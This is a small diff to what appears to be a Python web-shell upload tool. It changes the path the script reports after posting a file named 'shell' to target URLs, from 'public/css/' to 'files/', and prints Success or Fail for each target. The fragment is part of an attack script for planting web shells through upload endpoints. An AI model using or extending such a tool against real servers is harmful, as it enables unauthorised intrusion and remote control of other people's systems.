@@ -21,9 +21,9 @@ def main():
 		files = {'files': open(shell, 'rb')}
 		r = requests.post(x, files=files)
 		if r.status_code==200:
-			print("\nSuccess==>",x+'public/css/'+shell)
+			print("\nSuccess==>",x+'files/'+shell)
 		else:
-			print("\nFail==>",x+'public/css/'+shell)
+			print("\nFail==>",x+'files/'+shell)
 
 banner()
 main()    
